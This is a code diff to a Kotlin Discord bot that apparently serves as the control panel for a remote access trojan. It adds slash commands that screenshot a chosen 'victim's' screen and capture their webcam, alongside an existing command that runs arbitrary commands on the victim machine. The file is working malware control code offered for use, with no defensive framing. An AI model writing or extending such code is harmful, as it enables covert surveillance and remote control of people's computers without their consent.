@@ -1,6 +1,7 @@
 package bot.commands
 
 import bot.StatusChannel
+import dev.kord.x.emoji.Emojis
 import jdk.jshell.Snippet.Status
 import me.jakejmattson.discordkt.arguments.AnyArg
 import me.jakejmattson.discordkt.arguments.ChoiceArg
@@ -26,6 +27,28 @@ fun remote() = commands("Remote Actions") {
 
             // TODO: Serialized Frame handling
             Application.send(victim, "run:$command")
+        }
+    }
+
+    slash("screen", "Take a screenshot of the victim's computer screen and send it") {
+        execute(ChoiceArg("victim", "The online victim", *StatusChannel.status.filter { it.value }.keys.toTypedArray())) {
+            val victim = args.first
+            Application.send(victim, "screenshot")
+        }
+    }
+
+    slash("webcam", "Take a webcam capture from the victim and send it") {
+        execute(ChoiceArg("victim", "The online victim", *StatusChannel.status.filter { it.value }.keys.toTypedArray())) {
+            val victim = args.first
+            respondMenu {
+                page { title = "Are you sure?" }
+
+                buttons {
+                    button("Confirm", null) {
+                        Application.send(victim, "webcam")
+                    }
+                }
+            }
         }
     }
 
